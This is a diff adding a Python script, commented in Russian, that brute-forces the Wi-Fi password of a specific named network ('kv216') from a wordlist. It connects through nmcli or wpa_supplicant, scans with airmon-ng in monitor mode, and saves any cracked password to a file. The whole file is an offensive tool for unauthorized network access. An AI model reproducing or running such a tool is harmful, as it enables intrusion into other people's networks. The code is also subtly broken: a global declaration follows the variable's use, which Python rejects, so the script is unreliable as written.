@@ -1,0 +1,402 @@
+#!/usr/bin/env python3
+"""
+WiFi ПОДБОРЩИК ПАРОЛЕЙ
+Пробует все пароли из quick_list.txt для сети kv216
+"""
+
+import subprocess
+import time
+import os
+import sys
+from datetime import datetime
+
+# Конфигурация
+TARGET_SSID = "kv216"  # Сеть для взлома
+WORDLIST_FILE = "quick_list.txt"  # Файл с паролями
+INTERFACE = "wlan0"  # Wi-Fi интерфейс
+TIMEOUT = 5  # Секунд на попытку подключения
+
+class WiFiBruteForcer:
+    def __init__(self):
+        self.found = False
+        self.password = None
+        self.attempts = 0
+        self.start_time = None
+        self.total_passwords = 0
+        
+    def print_header(self):
+        """Заголовок программы"""
+        print("""
+╔═══════════════════════════════════════╗
+║        WiFi PASSWORD BRUTEFORCER      ║
+╠═══════════════════════════════════════╣
+║ Сеть: kv216                           ║
+║ Словарь: quick_list.txt               ║
+║ Метод: Полный перебор                 ║
+╚═══════════════════════════════════════╝
+        """)
+    
+    def load_passwords(self):
+        """Загрузка всех паролей из файла"""
+        print("[*] Загрузка паролей из quick_list.txt...")
+        
+        if not os.path.exists(WORDLIST_FILE):
+            print(f"[-] Файл {WORDLIST_FILE} не найден!")
+            print("[!] Создайте файл quick_list.txt с паролями")
+            return None
+        
+        passwords = []
+        try:
+            with open(WORDLIST_FILE, 'r', encoding='utf-8', errors='ignore') as f:
+                for line_num, line in enumerate(f, 1):
+                    pwd = line.strip()
+                    if pwd:
+                        passwords.append(pwd)
+                        # Показываем первые 10 паролей
+                        if line_num <= 10:
+                            print(f"    {line_num:3d}. {pwd}")
+            
+            self.total_passwords = len(passwords)
+            
+            if self.total_passwords == 0:
+                print("[-] Файл пустой! Добавьте пароли в quick_list.txt")
+                return None
+            
+            print(f"[+] Загружено паролей: {self.total_passwords}")
+            
+            if self.total_passwords > 10:
+                print(f"    ... и еще {self.total_passwords - 10} паролей")
+            
+            return passwords
+            
+        except Exception as e:
+            print(f"[-] Ошибка загрузки файла: {e}")
+            return None
+    
+    def check_interface(self):
+        """Проверка Wi-Fi интерфейса"""
+        print("\n[*] Проверка Wi-Fi интерфейса...")
+        
+        try:
+            # Ищем доступные интерфейсы
+            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
+            
+            # Ищем интерфейсы с поддержкой WiFi
+            interfaces = []
+            for line in result.stdout.split('\n'):
+                if 'IEEE 802.11' in line or 'ESSID' in line:
+                    iface = line.split()[0]
+                    if iface not in interfaces:
+                        interfaces.append(iface)
+            
+            if not interfaces:
+                print("[-] WiFi интерфейсы не найдены!")
+                return False
+            
+            print(f"[+] Найдены интерфейсы: {', '.join(interfaces)}")
+            
+            # Проверяем, доступен ли наш интерфейс
+            if INTERFACE in interfaces:
+                print(f"[+] Использую интерфейс: {INTERFACE}")
+                return True
+            else:
+                print(f"[!] Интерфейс {INTERFACE} не найден")
+                print(f"[*] Автоматически выбран: {interfaces[0]}")
+                global INTERFACE
+                INTERFACE = interfaces[0]
+                return True
+                
+        except Exception as e:
+            print(f"[-] Ошибка: {e}")
+            return False
+    
+    def check_network_available(self):
+        """Проверка, доступна ли сеть kv216"""
+        print("\n[*] Поиск сети kv216...")
+        
+        try:
+            # Быстрое сканирование
+            cmd = ['iwlist', INTERFACE, 'scan']
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            
+            if TARGET_SSID in result.stdout:
+                print(f"[+] Сеть '{TARGET_SSID}' найдена!")
+                return True
+            else:
+                print(f"[-] Сеть '{TARGET_SSID}' не найдена в быстром сканировании")
+                print("[*] Пробую глубокое сканирование...")
+                return self.deep_scan()
+                
+        except subprocess.TimeoutExpired:
+            print("[!] Таймаут сканирования")
+            return True  # Продолжаем в любом случае
+        except Exception as e:
+            print(f"[!] Ошибка сканирования: {e}")
+            return True  # Продолжаем в любом случае
+    
+    def deep_scan(self):
+        """Глубокое сканирование сетей"""
+        try:
+            # Включаем мониторный режим
+            subprocess.run(['airmon-ng', 'start', INTERFACE], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            monitor_iface = f"{INTERFACE}mon"
+            
+            # Сканируем 15 секунд
+            cmd = ['timeout', '15', 'airodump-ng', '--write', '/tmp/scan',
+                   '--output-format', 'csv', monitor_iface]
+            
+            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            # Читаем результаты
+            if os.path.exists('/tmp/scan-01.csv'):
+                with open('/tmp/scan-01.csv', 'r') as f:
+                    content = f.read()
+                
+                if TARGET_SSID in content:
+                    print(f"[+] Сеть '{TARGET_SSID}' найдена в глубоком сканировании!")
+                    
+                    # Ищем информацию о сети
+                    lines = content.split('\n')
+                    for line in lines:
+                        if TARGET_SSID in line:
+                            parts = line.split(',')
+                            if len(parts) > 3:
+                                bssid = parts[0].strip()
+                                channel = parts[3].strip()
+                                print(f"    BSSID: {bssid}")
+                                print(f"    Канал: {channel}")
+                            break
+                    
+                    found = True
+                else:
+                    print(f"[-] Сеть '{TARGET_SSID}' не найдена")
+                    found = False
+            else:
+                found = False
+            
+            # Выключаем мониторный режим
+            subprocess.run(['airmon-ng', 'stop', monitor_iface], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            return found
+            
+        except Exception as e:
+            print(f"[!] Ошибка глубокого сканирования: {e}")
+            return False
+    
+    def try_connect(self, password):
+        """Попытка подключения с паролем"""
+        try:
+            # Метод 1: Используем nmcli (самый надежный)
+            return self.try_nmcli(password)
+            
+        except Exception as e:
+            # Метод 2: Резервный метод
+            return self.try_wpa_supplicant(password)
+    
+    def try_nmcli(self, password):
+        """Подключение через NetworkManager"""
+        try:
+            # Удаляем старое подключение если есть
+            subprocess.run(['nmcli', 'connection', 'delete', TARGET_SSID],
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            # Пытаемся подключиться
+            cmd = [
+                'nmcli', 'device', 'wifi', 'connect', TARGET_SSID,
+                'password', password, 'ifname', INTERFACE
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=TIMEOUT)
+            
+            # Проверяем результат
+            if 'successfully' in result.stdout.lower() or 'успешно' in result.stdout.lower():
+                return True
+            
+            # Также проверяем статус подключения
+            time.sleep(2)
+            status_cmd = ['nmcli', '-t', '-f', 'GENERAL.STATE', 'device', 'show', INTERFACE]
+            status_result = subprocess.run(status_cmd, capture_output=True, text=True)
+            
+            if 'connected' in status_result.stdout.lower():
+                return True
+                
+            return False
+            
+        except subprocess.TimeoutExpired:
+            return False
+        except Exception:
+            return False
+    
+    def try_wpa_supplicant(self, password):
+        """Резервный метод через wpa_supplicant"""
+        try:
+            # Генерируем конфиг
+            config = f"""
+network={{
+    ssid="{TARGET_SSID}"
+    psk="{password}"
+    key_mgmt=WPA-PSK
+}}
+            """
+            
+            # Сохраняем временный конфиг
+            with open('/tmp/wpa_temp.conf', 'w') as f:
+                f.write(config)
+            
+            # Запускаем wpa_supplicant в фоне
+            cmd = ['wpa_supplicant', '-B', '-i', INTERFACE, '-c', '/tmp/wpa_temp.conf']
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            # Ждем
+            time.sleep(4)
+            
+            # Проверяем подключение
+            check_cmd = ['iwconfig', INTERFACE]
+            result = subprocess.run(check_cmd, capture_output=True, text=True)
+            
+            # Убиваем процесс
+            proc.terminate()
+            
+            # Удаляем временный файл
+            os.remove('/tmp/wpa_temp.conf')
+            
+            # Проверяем, подключены ли к нужной сети
+            if TARGET_SSID in result.stdout:
+                return True
+            else:
+                return False
+                
+        except Exception:
+            return False
+    
+    def brute_force(self):
+        """Основной цикл перебора"""
+        self.print_header()
+        
+        # Проверка прав
+        if os.geteuid() != 0:
+            print("[-] Запустите программу с sudo!")
+            print(f"    sudo python3 {sys.argv[0]}")
+            return False
+        
+        # Загрузка паролей
+        passwords = self.load_passwords()
+        if passwords is None:
+            return False
+        
+        # Проверка интерфейса
+        if not self.check_interface():
+            return False
+        
+        # Проверка доступности сети
+        if not self.check_network_available():
+            print(f"\n[-] Сеть '{TARGET_SSID}' недоступна")
+            print("[!] Убедитесь что:")
+            print("    1. Сеть включена и вещает SSID")
+            print("    2. Вы находитесь в зоне действия")
+            print("    3. WiFi адаптер работает корректно")
+            return False
+        
+        print(f"\n[*] Начинаю перебор {self.total_passwords} паролей...")
+        print("[*] Нажмите Ctrl+C для остановки\n")
+        
+        self.start_time = datetime.now()
+        
+        try:
+            for i, password in enumerate(passwords, 1):
+                self.attempts = i
+                
+                # Выводим прогресс
+                percent = (i / self.total_passwords) * 100
+                elapsed = (datetime.now() - self.start_time).total_seconds()
+                
+                print(f"\r[Прогресс: {percent:.1f}%] "
+                      f"Попытка {i}/{self.total_passwords}: "
+                      f"'{password}'", end='')
+                
+                # Пробуем подключиться
+                if self.try_connect(password):
+                    self.found = True
+                    self.password = password
+                    
+                    # Выводим результат
+                    print(f"\n\n{'='*60}")
+                    print("🎉 ПАРОЛЬ НАЙДЕН!")
+                    print(f"{'='*60}")
+                    print(f"Сеть: {TARGET_SSID}")
+                    print(f"Пароль: {password}")
+                    print(f"Попытка: {i}")
+                    print(f"Время: {elapsed:.1f} секунд")
+                    print(f"{'='*60}")
+                    
+                    # Сохраняем результат
+                    self.save_result(password, i, elapsed)
+                    return True
+                
+                # Небольшая пауза между попытками
+                time.sleep(1)
+        
+        except KeyboardInterrupt:
+            elapsed = (datetime.now() - self.start_time).total_seconds()
+            print(f"\n\n[!] Перебор остановлен пользователем")
+            print(f"[*] Проверено паролей: {self.attempts}")
+            print(f"[*] Затраченное время: {elapsed:.1f} секунд")
+            return False
+        
+        # Если дошли до конца
+        elapsed = (datetime.now() - self.start_time).total_seconds()
+        print(f"\n\n[-] Пароль не найден среди {self.total_passwords} вариантов")
+        print(f"[-] Затраченное время: {elapsed:.1f} секунд")
+        print(f"[-] Скорость: {self.total_passwords/elapsed:.1f} паролей/сек")
+        
+        return False
+    
+    def save_result(self, password, attempt, elapsed):
+        """Сохранение результата в файл"""
+        try:
+            filename = f"CRACKED_{TARGET_SSID}.txt"
+            with open(filename, 'w') as f:
+                f.write(f"{'='*40}\n")
+                f.write(f"WIFI PASSWORD CRACKED\n")
+                f.write(f"{'='*40}\n\n")
+                f.write(f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"Сеть: {TARGET_SSID}\n")
+                f.write(f"Пароль: {password}\n")
+                f.write(f"Попытка: {attempt}\n")
+                f.write(f"Время: {elapsed:.1f} сек\n")
+                f.write(f"Словрь: {WORDLIST_FILE}\n")
+                f.write(f"{'='*40}\n")
+            
+            print(f"\n[+] Результат сохранен в {filename}")
+            
+            # Генерируем команду для подключения
+            print(f"\n[*] Для подключения выполните:")
+            print(f"    nmcli device wifi connect {TARGET_SSID} password {password}")
+            
+        except Exception as e:
+            print(f"[-] Ошибка сохранения: {e}")
+
+def main():
+    """Точка входа"""
+    cracker = WiFiBruteForcer()
+    
+    try:
+        success = cracker.brute_force()
+        
+        if success:
+            print("\n[+] Взлом завершен успешно!")
+        else:
+            print("\n[-] Взлом не удался")
+        
+        print("\n[*] Нажмите Enter для выхода...")
+        input()
+        
+    except Exception as e:
+        print(f"\n[!] Критическая ошибка: {e}")
+        input("Нажмите Enter...")
+
+if __name__ == "__main__":
+    main()
